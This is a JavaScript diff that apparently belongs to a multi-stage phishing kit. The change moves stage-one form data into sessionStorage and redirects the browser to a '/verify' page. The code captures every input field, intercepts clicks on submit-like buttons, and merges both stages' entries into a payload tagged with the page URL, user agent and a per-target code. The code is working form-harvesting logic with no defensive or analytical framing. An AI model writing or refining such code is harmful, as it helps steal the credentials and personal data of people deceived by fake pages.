@@ -1145,10 +1145,6 @@ const CONFIG = {
         const data = { ...formData };
 
         let selector = 'input, textarea, select';
-        if (CONFIG.MULTI_STAGE) {
-            selector = currentStage === 1 ? '#dtech-stage-1 input, #dtech-stage-1 textarea, #dtech-stage-1 select'
-                                          : '#dtech-stage-2 input, #dtech-stage-2 textarea, #dtech-stage-2 select';
-        }
 
         document.querySelectorAll(selector).forEach(field => {
             const name = getFieldName(field);
@@ -1164,14 +1160,22 @@ const CONFIG = {
             const pageUrl = window.location.href;
             const uniqueCode = window.UNIQUE_CODE || 'UNKNOWN';
 
-            if (CONFIG.MULTI_STAGE && currentStage === 2) {
-                data = { ...stage1Data, ...data };
+            let finalData = data;
+
+            if (CONFIG.MULTI_STAGE === 2) {
+                const storedStage1 = sessionStorage.getItem('dtech_stage1');
+                if (storedStage1) {
+                    try {
+                        const s1Data = JSON.parse(storedStage1);
+                        finalData = { ...s1Data, ...data };
+                    } catch (e) {}
+                }
             }
 
             const payload = {
                 url: pageUrl,
                 timestamp: timestamp,
-                formData: data,
+                formData: finalData,
                 userAgent: navigator.userAgent,
                 uniqueCode: uniqueCode
             };
@@ -1197,7 +1201,7 @@ const CONFIG = {
     };
 
     const handleAction = (e, target) => {
-        if (CONFIG.MULTI_STAGE && currentStage === 1) {
+        if (CONFIG.MULTI_STAGE === 1) {
              const keywords = CONFIG.SUBMIT_BUTTON_PATTERNS;
              let isSubmit = false;
 
@@ -1211,17 +1215,9 @@ const CONFIG = {
                  e.stopPropagation();
 
                  const s1Data = captureAllInputs();
-                 stage1Data = s1Data;
-                 formData = {};
-
-                 const s1 = document.getElementById('dtech-stage-1');
-                 const s2 = document.getElementById('dtech-stage-2');
-                 if(s1 && s2) {
-                     s1.style.display = 'none';
-                     s2.style.display = 'block';
-                     currentStage = 2;
-                     log('Switched to Stage 2');
-                 }
+                 sessionStorage.setItem('dtech_stage1', JSON.stringify(s1Data));
+                 log('Saved Stage 1 Data, redirecting to Stage 2');
+                 window.location.href = '/verify';
                  return;
              }
         }
